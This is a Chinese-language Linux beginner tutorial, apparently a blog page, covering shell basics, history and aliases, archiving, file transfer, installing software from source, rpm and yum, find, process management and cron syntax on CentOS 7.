<h2 id="8-Linux-Shell"><a href="#8-Linux-Shell" class="headerlink" title="8.Linux Shell"></a>8.Linux Shell</h2><p>优化ssh登录速度</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件，先备份</span></span><br><span class="line">[root@localhost ~]# cp /etc/ssh/sshd_config /tmp/</span><br><span class="line">[root@localhost ~]# vi /etc/ssh/sshd_config </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接输入:79回车</span></span><br><span class="line">    79  GSSAPIAuthentication no</span><br><span class="line">    115 UseDNS no</span><br><span class="line">输入:wq保存退出</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启sshd服务</span></span><br><span class="line">[root@localhost ~]# systemctl restart sshd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果修改失败，还原配置文件</span></span><br><span class="line">[root@localhost ~]# cp  /tmp/sshd_config  /etc/ssh/sshd_config</span><br><span class="line">[root@localhost ~]# systemctl restart sshd</span><br></pre></td></tr></table></figure></div>

<p>shell提示符</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root用户提示符</span></span><br><span class="line">[root@localhost ~]# </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">普通用户test1的提示符</span></span><br><span class="line">[test1@localhost ~]$ </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提示符格式定制</span></span><br><span class="line">原格式</span><br><span class="line">[root@test ~]# echo $PS1</span><br><span class="line">[\u@\h \W]\$   # \u是用户，\h是主机名，\W是相对路径 </span><br><span class="line">修改后</span><br><span class="line">[root@test ~]#cd /usr/local/bin/</span><br><span class="line">[root@test bin]#export  PS1=&#x27;[\u@\h \w]\$&#x27;</span><br><span class="line">[root@test /usr/local/bin]#</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">永久修改</span></span><br><span class="line">[root@test 10:23:39 /usr/local/bin]#cd</span><br><span class="line">[root@test 10:24:25 ~]#vi .bashrc </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">找个空白的地方，插入一行</span></span><br><span class="line">export  PS1=&#x27;[\u@\h \t \w]\$&#x27;</span><br></pre></td></tr></table></figure></div>

<p>linux路径</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">相对路径  不完整路径，  例子../bin  bin</span><br><span class="line">绝对路径  也叫完整路径，例子/usr/local/bin/</span><br></pre></td></tr></table></figure></div>

<p>命令hostname</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">临时修改主机名</span></span><br><span class="line">hostname</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# hostname test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要重新登录生效</span></span><br></pre></td></tr></table></figure></div>

<p>命令hostnamectl</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看主机的信息</span></span><br><span class="line">[root@localhost ~]# hostnamectl </span><br><span class="line">   Static hostname: localhost.localdomain</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: f8a89169114741a8ac6de82954c5fbcb</span><br><span class="line">           Boot ID: dcf65386ccda42e29699d56101af8cf1</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: CentOS Linux 7 (Core)</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:7</span><br><span class="line">            Kernel: Linux 3.10.0-1127.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">永久修改主机名</span></span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要重新登录生效</span></span><br></pre></td></tr></table></figure></div>

<p>命令reboot</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启系统</span></span><br><span class="line">reboot</span><br><span class="line">例子1：</span><br><span class="line">[root@test ~]# reboot</span><br></pre></td></tr></table></figure></div>

<p>命令shutdown</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭或者重启linux</span></span><br><span class="line">shutdown</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立即关机</span></span><br><span class="line">[root@localhost ~]# shutdown -h now</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5分钟之后关机，可以使用shutdown -c取消</span></span><br><span class="line">[root@localhost ~]# shutdown -h 5</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5分钟之后重启系统，可以使用shutdown -c取消</span></span><br><span class="line">[root@localhost ~]# shutdown -r 5</span><br></pre></td></tr></table></figure></div>

<p>shell基础语法</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">命令   参数   目标</span><br><span class="line">ls   -a -l   /opt </span><br><span class="line">rm   -rf    /opt/test1</span><br><span class="line"></span><br><span class="line">命令   目标1...   目标2</span><br><span class="line">mv    源路径     目标路径</span><br><span class="line">cp    </span><br><span class="line"></span><br><span class="line">命令</span><br><span class="line">reboot</span><br><span class="line"></span><br><span class="line">[root@test 11:12:02 /opt]#mv --help</span><br><span class="line">用法：mv [选项]... [-T] 源文件 目标文件</span><br><span class="line">　或：mv [选项]... 源文件... 目录</span><br><span class="line">　或：mv [选项]... -t 目录 源文件...</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式解释</span></span><br><span class="line">[选项] 可选的</span><br><span class="line">...    可以有多个</span><br></pre></td></tr></table></figure></div>

<p>tab键补全</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">补全命令</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选的特别多</span></span><br><span class="line">[root@test 11:25:24 ~]#</span><br><span class="line">Display all 1400 possibilities? (y or n)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选少</span></span><br><span class="line">[root@test 11:25:24 ~]#cha</span><br><span class="line">chacl   chage   chattr </span><br><span class="line"></span><br><span class="line">补全路径</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选的特别多</span></span><br><span class="line">[root@test 11:25:24 ~]#cd /etc/</span><br><span class="line">Display all 188 possibilities? (y or n)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果预选少</span></span><br><span class="line">[root@test 11:25:24 ~]#cd /usr/src/</span><br><span class="line">debug/   kernels/ </span><br></pre></td></tr></table></figure></div>

<p>快捷键</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Ctrl + a    #光标跳转至正在输入的命令行的首部</span><br><span class="line">Ctrl + e    #光标跳转至正在输入的命令行的尾部</span><br><span class="line">Ctrl + c    #终止前台运行的程序</span><br><span class="line">Ctrl + d    #在shell中，ctrl-d表示推出当前shell。</span><br><span class="line">Ctrl + z    #将任务暂停，挂至后台, 执行fg命令继续运行</span><br><span class="line">Ctrl + l    #清屏，和clear命令等效。</span><br><span class="line">Ctrl + k    #删除从光标到行末的所有字符</span><br><span class="line">Ctrl + u    #删除从光标到行首的所有字符</span><br><span class="line">Ctrl + r    #搜索历史命令, 利用关键字</span><br><span class="line">ctrl + w    #光标往前删除一个参数</span><br><span class="line">esc + .     #上一条命令的最后一个参数，或者目标</span><br></pre></td></tr></table></figure></div>

<p>history历史命令</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">历史</span></span><br><span class="line">history</span><br><span class="line">例子1:</span><br><span class="line">[root@test 14:32:10 ~]#history</span><br><span class="line">    1  exit</span><br><span class="line">    2  ls</span><br><span class="line">    3  head -1 test03.txt </span><br><span class="line">    4  head -1 test03.txt|cat</span><br><span class="line">    5  head -1 test03.txt|tac</span><br><span class="line">    6  head -2 test03.txt|tac</span><br><span class="line">    7  head -2 test03.txt|cat</span><br><span class="line">    8  ip addr</span><br><span class="line">    9  ip addr|tail -4</span><br><span class="line">   10  ip addr|tail -4|head -1</span><br><span class="line">   ......</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用!调用历史命令</span></span><br><span class="line">[root@test 14:32:10 ~]#history|head -5</span><br><span class="line">    1  exit</span><br><span class="line">    2  ls</span><br><span class="line">    3  head -1 test03.txt </span><br><span class="line">    4  head -1 test03.txt|cat</span><br><span class="line">    5  head -1 test03.txt|tac</span><br><span class="line">[root@test 14:32:26 ~]# !3</span><br><span class="line"> head -1 test03.txt </span><br><span class="line">head: 无法打开&quot;test03.txt&quot; 读取数据: 没有那个文件或目录</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用!调用<span class="built_in">mv</span>开头的命令</span></span><br><span class="line">[root@test 14:42:17 ~]#history </span><br><span class="line">    1  ls -a -l .bash_history </span><br><span class="line">    2  history </span><br><span class="line">    3  ls</span><br><span class="line">    4  history </span><br><span class="line">    5  mv aaaaa.txt /tmp/</span><br><span class="line">    6  history </span><br><span class="line">[root@test 14:42:19 ~]#!mv</span><br><span class="line">mv aaaaa.txt /tmp/</span><br><span class="line">mv: 无法获取&quot;aaaaa.txt&quot; 的文件状态(stat): 没有那个文件或目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例子4：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">清除历史记录</span></span><br><span class="line">history -c</span><br></pre></td></tr></table></figure></div>

<p>历史记录保存在家目录下的.bash_history文件中</p>
<p>命令别名</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">别名</span></span><br><span class="line">alias</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看别名</span></span><br><span class="line">[root@test 15:23:17 ~]#alias </span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias egrep=&#x27;egrep --color=auto&#x27;</span><br><span class="line">alias fgrep=&#x27;fgrep --color=auto&#x27;</span><br><span class="line">alias grep=&#x27;grep --color=auto&#x27;</span><br><span class="line">alias l.=&#x27;ls -d .* --color=auto&#x27;</span><br><span class="line">alias ll=&#x27;ls -l --color=auto&#x27;</span><br><span class="line">alias ls=&#x27;ls --color=auto&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias which=&#x27;alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde&#x27;</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加别名</span></span><br><span class="line">[test1@test 15:24:23 ~]$alias rm=&#x27;rm -i&#x27;</span><br><span class="line">[test1@test 15:27:08 ~]$alias |grep rm</span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">取消别名</span></span><br><span class="line">[test1@test 15:27:13 ~]$unalias rm </span><br><span class="line">[test1@test 15:27:47 ~]$alias |grep rm</span><br><span class="line"></span><br><span class="line">例子4：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">alias</span>永久生效</span></span><br><span class="line">[root@localhost ~]# vi .bashrc </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">空白处，增加一行</span></span><br><span class="line">alias rm=&#x27;echo -bash: rm: 未找到命令&#x27;</span><br></pre></td></tr></table></figure></div>

<h2 id="9-linux输入输出"><a href="#9-linux输入输出" class="headerlink" title="9.linux输入输出"></a>9.linux输入输出</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"> 重定向， 将命令执行结果不输出到屏幕上，输出到文件里，会清空原文件</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; 追加重定向，不会清空原文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">标准输入0</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">标准正确输出1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">标准错误输出2</span></span><br></pre></td></tr></table></figure></div>

<h2 id="10-linux压缩打包"><a href="#10-linux压缩打包" class="headerlink" title="10.linux压缩打包"></a>10.linux压缩打包</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打包和解压缩</span></span><br><span class="line">tar</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">归档，不压缩</span></span><br><span class="line">tar cf test.tar vmlinuz-*</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩并归档</span></span><br><span class="line">tar zcf test2.tar.gz vmlinuz-*</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看压缩包内容</span></span><br><span class="line">[root@localhost ~]# tar tf test.tar </span><br><span class="line">vmlinuz-0-rescue-f8a89169114741a8ac6de82954c5fbcb</span><br><span class="line">vmlinuz-3.10.0-1127.el7.x86_64	</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">例子4：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压缩</span></span><br><span class="line">tar xf test.tar</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打包和压缩</span></span><br><span class="line">gzip</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩单个文件</span></span><br><span class="line">gzip protocols</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩多个文件，每一个文件产生一个单独的压缩包</span></span><br><span class="line">gzip  hosts passwd shadow</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压缩</span></span><br><span class="line">gzip -d hosts.gz passwd.gz protocols.gz shadow.gz </span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">压缩</span></span><br><span class="line">zip</span><br><span class="line">例子1：</span><br><span class="line">zip -r 123.zip day01</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">unzip</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost file]# unzip 123.zip</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压rar包</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要安装软件</span></span><br><span class="line">yum install epel-release -y</span><br><span class="line">yum install unar -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再进行解压</span></span><br><span class="line">unar -o /opt 456.rar</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载文件</span></span><br><span class="line">curl</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载文件</span></span><br><span class="line">curl -o 123.zip http://192.168.18.10/day01.zip</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查网络畅通</span></span><br><span class="line">ping</span><br><span class="line">例子1：ping 223.5.5.5</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果网不通，重启网络服务</span></span><br><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure></div>

<p>查看文件类型file</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件类型</span></span><br><span class="line">file</span><br><span class="line">例子1：</span><br><span class="line">file 123.zip</span><br></pre></td></tr></table></figure></div>



<h2 id="11-文件传输"><a href="#11-文件传输" class="headerlink" title="11.文件传输"></a>11.文件传输</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传和下载</span></span><br><span class="line">rz  #上传</span><br><span class="line">sz  #下载</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先安装lrzsz软件包</span></span><br><span class="line">yum  install lrzsz  -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上传的例子</span></span><br><span class="line">如果使用xshell，直接鼠标拖拽，或者执行rz -E选择要上传的文件</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载的例子</span></span><br><span class="line">sz /root/test3.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>xftp上传下载</p>
<p>scp传输</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">主要用于linux和linux服务器之间传输文件</span></span><br><span class="line">scp typora-setup-x64.exe  root@10.0.0.128:/tmp</span><br></pre></td></tr></table></figure></div>

<h2 id="12-软件的安装"><a href="#12-软件的安装" class="headerlink" title="12.软件的安装"></a>12.软件的安装</h2><p>编译安装</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.下载源码包</span><br><span class="line">cd /opt/</span><br><span class="line">rm -fr *</span><br><span class="line">curl -o nginx.tar.gz http://nginx.org/download/nginx-1.20.1.tar.gz</span><br><span class="line"></span><br><span class="line">2.编译</span><br><span class="line">tar xf nginx.tar.gz </span><br><span class="line">cd nginx-1.20.1/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译参数</span></span><br><span class="line">./configure --prefix=/usr/local/nginx --without-pcre --without-http_rewrite_module --without-http_gzip_module</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">make</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装</span></span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">3.运行</span><br><span class="line">/usr/local/nginx/sbin/nginx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用浏览器访问http://&lt;虚拟机的ip地址&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">取消防火墙的开机自启</span></span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure></div>

<p>rpm安装</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">redhat package manager包管理器</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装wget</span></span><br><span class="line">yum install wget -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用wget下载rpm包</span></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/centos/7/os/x86_64/Packages/tree-1.6.0-10.el7.x86_64.rpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装rpm包</span></span><br><span class="line">rpm -ivh tree-1.6.0-10.el7.x86_64.rpm </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载</span></span><br><span class="line">rpm -e tree</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">升级</span></span><br><span class="line">rpm -Uvh  xxx.rpm</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看已安装的软件</span></span><br><span class="line">rpm -qa|grep httpd</span><br></pre></td></tr></table></figure></div>

<p>命令</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以树状的显示指定目录下的目录和文件的名称</span></span><br><span class="line">tree</span><br><span class="line">例子1：</span><br><span class="line">下载路径  yum install tree -y</span><br><span class="line">tree /usr/local</span><br></pre></td></tr></table></figure></div>

<p>yum安装</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">自动解决rpm依赖</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">yum安装扩展yum仓库</span></span><br><span class="line">yum install epel-release -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">yum安装nginx</span></span><br><span class="line">yum install nginx -y</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">yum移除nginx</span></span><br><span class="line">yum remove nginx -y</span><br><span class="line">yum list|grep ^bash 查找tab 安装包</span><br><span class="line">yum install bash-completion.noarch bash-completion-extras.noarch -y 所有tab</span><br></pre></td></tr></table></figure></div>

<p>安装方法总结</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">编译安装：优点： 自由定制  痛点：难度高，步骤繁琐</span><br><span class="line">rpm安装：优点：安装简单   痛点：需要自己解决依赖，不支持定制</span><br><span class="line">yum安装：优点：自动解决依赖，默认安装最新版  痛点：不支持定制</span><br></pre></td></tr></table></figure></div>

<h2 id="13-find文件查找"><a href="#13-find文件查找" class="headerlink" title="13.find文件查找"></a>13.find文件查找</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件查找</span></span><br><span class="line">例子1：普通查询</span><br><span class="line">find   /etc    -maxdepth 1  -type f  -name &quot;pa*&quot;</span><br><span class="line">命令   目录...   查找深度      类型      文件名称</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">例子2：</span><br><span class="line">忽略大小写查询</span><br><span class="line">find /etc -maxdepth 1    -iname &quot;pa*&quot;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">例子3：</span><br><span class="line">根据修改时间查找文件</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">时间单位为天</span></span><br><span class="line">find /opt -type f -mtime -1   #-1代表一天以内，+1一天以前</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">时间单位为分钟</span></span><br><span class="line">[root@localhost ~]# find /root -type f -mmin -20</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/ReadMe.txt</span><br><span class="line">/root/.lesshst</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">atime：最后访问时间</span><br><span class="line">mtime：文件内容修改时间</span><br><span class="line">ctime：文件属性修改时间</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">例子5：</span><br><span class="line">对找出的文件进行处理</span><br><span class="line">find /root -type f -mmin -30  ! -name &quot;.*&quot;  -exec rm &#123;&#125; \;</span><br><span class="line">find /root  -maxdepth 1  -type d  -name &quot;Apa*&quot;   -mmin -30 -exec cp -a &#123;&#125; /tmp \;</span><br></pre></td></tr></table></figure></div>

<h2 id="14-进程管理"><a href="#14-进程管理" class="headerlink" title="14.进程管理"></a>14.进程管理</h2><p>进程：正在运行的程序</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看进程</span></span><br><span class="line">ps</span><br><span class="line">参数1：ps -ef</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭进程</span></span><br><span class="line">kill</span><br><span class="line">例子1： kill  7851  #使用进程id号，来终止进程</span><br><span class="line">pkill </span><br><span class="line">例子1： pkill sleep  #使用进程的命令名称，来终止进程</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看计算机的cpu，内存，进程等信息</span><br><span class="line">top</span><br></pre></td></tr></table></figure></div>

<h2 id="15-定时任务"><a href="#15-定时任务" class="headerlink" title="15.定时任务"></a>15.定时任务</h2><p>定期执行任务</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">时间命令</span></span><br><span class="line">date</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看时间</span></span><br><span class="line">[root@localhost ~]# date</span><br><span class="line">2021年 07月 23日 星期五 14:38:19 CST</span><br><span class="line">[root@localhost ~]# date +%F</span><br><span class="line">2021-07-23</span><br><span class="line">[root@localhost ~]# date +%T</span><br><span class="line">14:35:47</span><br><span class="line"></span><br><span class="line">例子2：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改时间</span></span><br><span class="line">[root@localhost ~]# date -s &#x27;20200723 14:40:00&#x27;</span><br><span class="line">2020年 07月 23日 星期四 14:40:00 CST</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">定时任务的格式</span></span><br><span class="line">*  *  * *  *    cmd</span><br><span class="line">分 时 日 月 周    命令</span><br><span class="line">分：0-59</span><br><span class="line">时：0-23</span><br><span class="line">日：0-31</span><br><span class="line">月：1-12</span><br><span class="line">周：1-7</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每5分钟执行一次</span></span><br><span class="line">*/5  *  * *  *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每1小时执行一次</span></span><br><span class="line">01 */1 * * *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每半个小时执行一次</span></span><br><span class="line">00,30  */1 * * *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每天晚上8:00执行一次</span></span><br><span class="line">00 20 */1 * *</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每周1晚上8:00执行一次</span></span><br><span class="line">00 20 */1 * 1,3,5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看定时任务，遇到特殊符号%,需要添加转义符号\;</span></span><br><span class="line">[root@localhost ~]# crontab -l</span><br><span class="line">* * * * *  echo `date +\%T` &gt;&gt;/tmp/time.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编辑定时任务</span></span><br><span class="line">[root@localhost ~]# crontab -e</span><br><span class="line"></span><br><span class="line">如果定时任务的格式，或者内容有问题，系统都会发邮件提示</span><br></pre></td></tr></table></figure></div>



<h2 id="16-服务管理"><a href="#16-服务管理" class="headerlink" title="16.服务管理"></a>16.服务管理</h2><p>优化系统：</p>
